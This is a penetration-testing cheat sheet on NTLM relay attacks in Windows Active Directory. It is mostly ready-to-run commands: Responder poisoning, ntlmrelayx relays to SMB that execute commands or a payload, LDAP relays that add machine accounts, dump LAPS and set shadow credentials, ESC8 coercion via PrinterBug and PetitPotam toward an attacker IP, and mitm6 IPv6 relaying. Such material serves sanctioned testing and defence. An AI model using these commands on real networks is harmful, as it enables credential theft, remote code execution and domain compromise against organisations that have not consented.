# NTLM Relays

## 📚 Resources

- [How it's work ? (THR)](https://www.thehacker.recipes/ad/movement/ntlm/relay) - [Very Complete Explanation](https://beta.hackndo.com/ntlm-relay/)
- [vaadata](https://www.vaadata.com/en/blog/understanding-ntlm-authentication-and-ntlm-relay-attacks/)
- [Pwning with Responder](https://notsosecure.com/pwning-with-responder-a-pentesters-guide)
- [MultiRelay](https://ayinedjimi-consultants.fr/articles/ntlm-relay-attack-responder-ntlmrelayx)
- [ntlmrelayx.com](https://ntlmrelayx.com/)

## 🛠️ Tools

- [Responder](https://github.com/lgandx/Responder)
- [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)

## Responder

```bash
sudo responder -I <interface> # ALL (all interfaces)
-i <IP> # ignore specific IP
-e # Poison all requests with another IP address than Responder's one.
-w # Start WPAD rogue proxy server
-P # Proxy Auth
-d # Enable answers for DHCP broadcast requests, inject WPAD in DHCP response
--lm # force LM hashing downgrade for Windows SRV 2003
-t | --ttl # change ttl value (value in hex)

responder -I "eth0" -wP # WPAD + ProxyAuth
```

## MultiRelayX

You can use NTLM hashes to use PtH attack by example or use `impacket-ntlmrelayx` in parallele of responder to relays NTLM session and use it directly.

Listing machines without SMB signin required

```bash
nxc smb $SUBNET_TARGET/$NETMASK_TARGET --gen-relay-list relay-targets.txt
```

1. NTLM Relay to SMB (execute command)

```bash
# Execute payloads
sudo ntlmrelayx.py -t smb://$TARGET -c "whoami"
sudo ntlmrelayx.py -tf relay-targets.txt -e payload.exe

# Shell over SOCKS
sudo ntlmrelayx.py -tf relay-targets.txt -smb2support -i

# Relay to MS Exchange (get mails)
sudo ntlmrelayx.py -t https://mail.$DOMAIN/EWS/Exchange.asmx -smb2support --no-smb-server
```

2. NTLM Relay to LDAP (MachineAccountQuota, DCSync)

```bash
# Create machine
sudo ntlmrelayx.py -t ldap://$TARGET --add-computer SUPPORT$ -smb2support

# DCSync
sudo ntlmrelayx.py -t ldap://$TARGET --dump-laps

# Relay multi targets
sudo ntlmrelayx.py -tf relay-targets.txt smb2support --no-http-server

# Shadow Credential (pyWhisker)
sudo ntlmrelayx.py -t ldap://$TARGET --shadow-credentials --shadow-target 'DC01$'
```

### ESC8

#### PrinterBug / SpoolSample

```bash
python3 printerbug.py $DOMAIN/$USER:$PASSWORD@$TARGET_IP $ATTACKER_IP

# On attacker machine
sudo ntlmrelayx.py -t dcsync://$ATTACKER_IP --no-smb-server --no-http-server
```

#### PetitPotam

```bash
ntlmrelayx.py \
    -t http://$CA_IP/certsrv/certfnsh.asp \
    --adcs -smb2support \
    --template DomainController

# coerce DC01$ to authenticate
python PetitPotam.py $ATTACKER_IP $DC_IP
```

### NTLM Relay via IPv6

```bash
sudo mitm6 -d $DOMAIN
sudo ntlmrelayx.py -6 -t ldap://$TARGET -wh wpad.$DOMAIN --add-computer
```
